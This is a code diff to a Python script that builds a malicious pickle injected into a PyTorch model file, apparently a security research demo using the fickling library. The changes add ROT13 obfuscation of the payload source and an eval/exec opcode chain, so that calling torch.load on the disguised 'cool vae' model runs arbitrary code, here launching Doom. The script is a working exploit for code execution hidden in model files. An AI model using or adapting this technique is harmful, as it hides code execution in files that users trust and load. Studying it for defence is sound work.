@@ -5,6 +5,7 @@ import sys
 import pickle
 import pickletools as pt
 import tarfile
+import torch
 
 from fickling import pickle as p
 from fickling.pickle import Pickled
@@ -31,6 +32,7 @@ def get_doom_binbytes() -> p.BinBytes:
     doom_ball.add("doom_ascii")
     print([member.name for member in doom_ball.getmembers()])
     os.chdir("..")
+    print(os.getcwd())
     doom_ball.close()
     doom_buf.seek(0)
     # proto, binbytes, stop
@@ -106,6 +108,11 @@ def hidden_unicode(uni: bytes) -> list[p.Opcode]:
 # ...dup?
 # what if we had stackdata with an argument?
 
+
+rot13 = {97 + i: 97 + (i + 13) % 26 for i in range(26)}
+payload_body = open("payload.py").read().translate(rot13)
+rot13_payload = '"""' + payload_body + '""".translate({97+i:97+(i+13)%26 for i in range(26)})'
+
 exploit = [
     # from torch._utils import _rebuild_tensor as orig_rebuild_tensor
     *get_value(),
@@ -129,14 +136,20 @@ exploit = [
     p.StackGlobal(),
     # _utils._rebuild_tensor = orig_rebuild_tensor
     *set_value(memos["orig_rebuild_tensor"]),
-    # grab payload source
-    p.Unicode(f'''exec("""{open("payload.py").read()}""") or payload'''.encode()),
+    memos.assign("eval"),
+    memos["eval"],
+    # stack: [eval, eval]
+    # un-rot13 payload source
+    p.Unicode(rot13_payload.encode()),
     p.TupleOne(),
-    p.Reduce(),  # define payload fn, `eval(exec(payload))`
+    p.Reduce(), # eval(<rot13_payload>.translate(rot13))
+    # stack: [eval, plaintext_payload]
+    p.TupleOne(),
+    p.Reduce(),  # define payload fn, `eval(exec(payload) or payload)`
     get_doom_binbytes(),
     p.TupleOne(),
     p.Reduce(),  # payload(doom_bytes)
-    p.Pop(),
+    p.Pop(), #p.Pop(),
 ]
 
 
@@ -211,6 +224,6 @@ f.close()
 print("loading cool vae")
 # note! this launches doom! and waits for it to exit!
 # doom is poorly behaved and doesn't clean up the screen
-# cool_model = torch.load(output_path)
-# print(cool_model)
+cool_model = torch.load(output_path)
+print(cool_model)
 pt.dis(dumped, out=open("vae_dis", "w"))
